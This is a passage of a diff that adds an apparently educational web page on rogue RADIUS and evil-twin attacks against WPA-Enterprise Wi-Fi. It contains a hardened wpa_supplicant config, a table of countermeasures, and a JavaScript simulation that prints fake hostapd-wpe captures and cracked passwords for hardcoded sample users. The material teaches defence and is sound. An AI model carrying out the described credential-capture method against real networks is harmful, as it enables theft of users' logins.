+          <span>&#128196; wpa_supplicant — hardened PEAP config</span>
+          <button onclick="copyConfig(this,'copy-supplicant')">Copy</button>
+        </div>
+        <div class="config-body" id="copy-supplicant"><span class="cfg-key">network</span>={
+    <span class="cfg-key">ssid</span>=<span class="cfg-val">"CorpWiFi"</span>
+    <span class="cfg-key">key_mgmt</span>=<span class="cfg-val">WPA-EAP</span>
+    <span class="cfg-key">eap</span>=<span class="cfg-val">PEAP</span>
+    <span class="cfg-key">identity</span>=<span class="cfg-val">"alice@corp.com"</span>
+    <span class="cfg-key">password</span>=<span class="cfg-val">"Summer2024!"</span>
+    <span class="cfg-key">phase2</span>=<span class="cfg-val">"auth=MSCHAPV2"</span>
+
+    <span class="cfg-comment"># CRITICAL — validate server cert against internal CA</span>
+    <span class="cfg-key">ca_cert</span>=<span class="cfg-val">"/etc/ssl/certs/corp-radius-ca.pem"</span>
+    <span class="cfg-key">subject_match</span>=<span class="cfg-val">"/CN=radius.corp.com"</span>
+    <span class="cfg-comment"># Rogue RADIUS with wrong cert = connection refused</span>
+}</div>
+      </div>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th>Countermeasure</th><th>Priority</th><th>Blocks</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>Pin RADIUS server certificate on all supplicants</td><td style="color:var(--accent3)">Critical</td><td>All rogue RADIUS attacks</td></tr>
+            <tr><td>Deploy EAP-TLS (certificate auth)</td><td style="color:var(--accent3)">High</td><td>Password-based attacks</td></tr>
+            <tr><td>Migrate to WPA3-Enterprise</td><td style="color:var(--warn)">High</td><td>Downgrade + MSCHAPv2</td></tr>
+            <tr><td>Enable WIPS rogue AP detection</td><td style="color:var(--warn)">High</td><td>Detects evil twin setup</td></tr>
+            <tr><td>WPA3-only mode (disable transition)</td><td style="color:var(--warn)">Medium</td><td>WPA3 downgrade</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </section>
+
+    <div class="nav-footer">
+      <a href="../module-12-pmkid-attack/" class="nav-btn prev">&#8592; Module 12: PMKID Attack</a>
+      <a href="../module-14-attack-chaining/" class="nav-btn next">Module 14: Attack Chaining &#8594;</a>
+    </div>
+  </main>
+</div>
+
+<script>
+  function copyTerm(btn, id) {
+    const el = document.getElementById(id);
+    navigator.clipboard.writeText((el.innerText || el.textContent).trim()).then(() => {
+      btn.textContent = 'Copied!'; btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+  function copyConfig(btn, id) {
+    const el = document.getElementById(id);
+    navigator.clipboard.writeText((el.innerText || el.textContent).trim()).then(() => {
+      btn.textContent = 'Copied!'; btn.classList.add('copied');
+      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
+    });
+  }
+
+  let simRunning = false;
+
+  const fakeUsers = [
+    { user:'alice@corp.com',   challenge:'5d:9b:4b:1f:3a:2e:7c:8d', response:'a1:b2:c3:d4:e5:f6:a7:b8:c9:d0', password:'Summer2024!' },
+    { user:'bob.smith',        challenge:'11:22:33:44:aa:bb:cc:dd', response:'99:88:77:66:55:44:33:22:11:00', password:'Welcome1!'   },
+    { user:'carol@corp.com',   challenge:'de:ad:be:ef:ca:fe:00:11', response:'12:34:56:78:9a:bc:de:f0:12:34', password:'P@ssw0rd2024' },
+  ];
+
+  function runEntSim() {
+    if (simRunning) return;
+    simRunning = true;
+
+    const ssid    = document.getElementById('simSSID').value || 'CorpWiFi';
+    const eap     = document.getElementById('simEAP').value;
+    const certval = document.getElementById('simCertVal').value;
+    const output  = document.getElementById('entOutput');
+    const credLog = document.getElementById('credLog');
+    const credEntries = document.getElementById('credEntries');
+    const btn     = document.getElementById('simBtn');
+
+    output.innerHTML = '';
+    credLog.classList.remove('show');
+    credEntries.innerHTML = '';
+    btn.disabled = true;
+
+    const eapNames = { peap:'PEAP-MSCHAPv2', ttls:'EAP-TTLS/PAP', leap:'EAP-LEAP' };
+    const captured = [];
+
+    const append = (txt, delay) => setTimeout(() => {
+      output.innerHTML += txt + '\n';
+      output.scrollTop = output.scrollHeight;
+    }, delay);
+
+    append(`<span style="color:var(--accent2)">[*]</span> Generating certificates...`, 0);
+    append(`<span style="color:var(--accent2)">[✓]</span> Self-signed CA + server cert ready`, 500);
+    append(`<span style="color:var(--accent2)">[*]</span> Starting hostapd-wpe: SSID=<span style="color:var(--accent)">${ssid}</span> EAP=<span style="color:var(--accent)">${eapNames[eap]}</span>`, 900);
+    append(`<span style="color:var(--accent2)">[✓]</span> wlan1: AP-ENABLED`, 1300);
+    append(`<span style="color:var(--text-dim)">[*]</span> Waiting for clients...`, 1600);
+    append(``, 1800);
+
+    if (certval === 'yes') {
+      setTimeout(() => {
+        append(`<span style="color:var(--warn)">[!]</span> Client connected, presenting server cert...`, 2200);
+        append(`<span style="color:var(--accent3)">[✗]</span> Client rejected cert — CA validation ENABLED`, 2800);
+        append(`<span style="color:var(--accent3)">[✗]</span> EAP-Failure: certificate not trusted`, 3200);
+        append(``, 3500);
+        append(`<span style="color:var(--accent2)">Attack failed — client properly validates RADIUS certificate.</span>`, 3700);
+        append(`<span style="color:var(--text-dim)">This is the correct, hardened configuration.</span>`, 4000);
+        setTimeout(() => { simRunning = false; btn.disabled = false; }, 4200);
+      }, 0);
+      return;
+    }
+
+    // Successful attack path
+    const victims = eap === 'leap' ? fakeUsers.slice(0,1) : fakeUsers;
+    victims.forEach((v, i) => {
+      const base = 2200 + i * 2200;
+      append(`<span style="color:var(--accent3)">[+]</span> Client connecting: ${v.user}`, base);
+      append(`<span style="color:var(--text-dim)">    TLS handshake — client accepted self-signed cert`, base + 400);
+      append(`<span style="color:var(--text-dim)">    ${eapNames[eap]} inner authentication...`, base + 800);
+      append(`<span style="color:var(--accent2)">[CAPTURED]</span> ${eap === 'ttls' ? 'cleartext password' : 'MSCHAPv2 hash'} from ${v.user}`, base + 1300);
+
+      setTimeout(() => {
+        captured.push(v);
+        renderCredLog(captured, credLog, credEntries, eap);
+      }, base + 1400);
+    });
+
+    const totalDelay = 2200 + victims.length * 2200;
+    setTimeout(() => {
+      append(``, totalDelay);
+      append(`<span style="color:var(--accent2)">[*]</span> Running asleap / hashcat against captured hashes...`, totalDelay + 200);
+      setTimeout(() => {
+        victims.forEach((v, i) => {
+          setTimeout(() => {
+            append(`<span style="color:var(--accent2)">[CRACKED]</span> <span style="color:var(--accent)">${v.user}</span> → <span style="color:var(--accent2);font-weight:700">${v.password}</span>`, 0);
+            output.scrollTop = output.scrollHeight;
+            // Update cred log with cracked pass
+            document.querySelectorAll('.cred-entry').forEach((el, idx) => {
+              if (idx === i) {
+                const crackSpan = el.querySelector('.ce-crack');
+                if (crackSpan) crackSpan.textContent = 'password: ' + v.password;
+              }
+            });
+          }, i * 600);
+        });
+        setTimeout(() => { simRunning = false; btn.disabled = false; }, victims.length * 600 + 400);
+      }, 1500);
+    }, 0);
+  }
+
+  function renderCredLog(entries, section, container, eap) {
+    section.classList.add('show');
+    container.innerHTML = entries.map(e =>
+      `<div class="cred-entry">
+        <span class="ce-user">username: ${e.user}</span><br>
+        ${eap === 'ttls'
+          ? `<span class="ce-chal">password (cleartext): ${e.password}</span>`
+          : `<span class="ce-chal">challenge: ${e.challenge}</span><br>
+             <span class="ce-resp">response:  ${e.response}:...</span><br>
+             <span class="ce-crack"></span>`
+        }
+      </div>`
+    ).join('');
+  }
+</script>
+</body>
+</html>
